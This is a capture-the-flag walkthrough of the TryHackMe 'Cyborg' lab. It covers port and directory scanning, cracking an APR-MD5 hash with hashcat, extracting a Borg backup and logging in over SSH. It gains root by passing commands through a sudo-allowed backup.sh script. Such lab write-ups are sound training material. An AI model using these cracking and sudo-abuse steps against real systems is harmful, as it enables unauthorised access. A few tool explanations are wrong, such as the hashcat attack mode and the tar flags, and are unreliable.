# TRYHACKME – Cyborg (CTF)

![cyborg.png](cyborg.png)

Use nmap tool to scan target ports

**`nmap 10.10.23.140`**

![Untitled.png](Untitled.png)

Port: Services:

22     ssh (Secure Shell)

80     http (Hypertext Transfer Protocol)

Use gobuster tool to brute-force directories on web servers

`gobuster dir -u http://10.10.23.140 -w /usr/share/seclists/Discovery/Web-Content/common.txt`

> dir –> to search for directories

> -u –> specify the URL

> -w –> path to the worldlist

![2024-10-12 02_44_02-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_44_02-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

Directories found:

/admin

/etc

![2024-10-12 02_45_55-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_45_55-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

![2024-10-12 02_47_02-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_47_02-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

![2024-10-12 02_47_53-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_47_53-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

**Identify the hash type**

**`hash-identifier`** 

**> hash** –> **$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.**

![2024-10-12 02_49_47-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_49_47-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

**hash type: md5(APR)**

Crack hash using hashcat tool

**`hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`**

> -m –> specifies the hash type (1600 – md5 APR)

> -a –> specifies the attack mode (0 – brute force)

![2024-10-12 02_51_27-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_51_27-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

![2024-10-12 02_55_34-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_55_34-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

Unzip the file

**`tar –xf archive.tar`**

> -xf –> used to extract .rar files

![2024-10-12 02_56_19-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_56_19-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

![2024-10-12 02_57_22-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_57_22-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

![2024-10-12 02_56_19-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_02_56_19-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox%201.png)

**`cat README`**

Give as a hint to search for BorgBackup tool

Download borgbackup tool

**`apt install borgbackup –y`**

Extract files with borg

**`sudo borg extract Downloads/home/field/dev/final_archive::music_archive`**

Use the previous cracked  password

**`cat note.txt`**

![2024-10-12 03_02_04-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_02_04-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

Connect to the target machine via ssh

**`ssh alex@10.10.159.75`**

![2024-10-12 03_03_59-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_03_59-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

**`cat user.txt`**

![2024-10-12 03_05_03-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_05_03-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

List the user privileges to see what we can do with this user

**`sudo -l`**

![2024-10-12 03_06_23-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_06_23-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

alex can run this script as “sudo”

`cd /etc/mp3backups`

![2024-10-12 03_11_51-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_11_51-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

**`cat backup.sh`**

![2024-10-12 03_13_07-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_13_07-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

Optional arguments can be passed through this instruction (OPTARG) 

List directories on root

**`sudo ./backup.sh -c “ls /root”`**

> -c –> pass a command

![2024-10-12 03_20_07-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_20_07-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)

**`sudo ./backup.sh -c “cat /root/root.txt”`**

![2024-10-12 03_21_40-TRYHACKME – Cyborg (CTF).docx — Mozilla Firefox.png](2024-10-12_03_21_40-TRYHACKME__Cyborg_(CTF).docx__Mozilla_Firefox.png)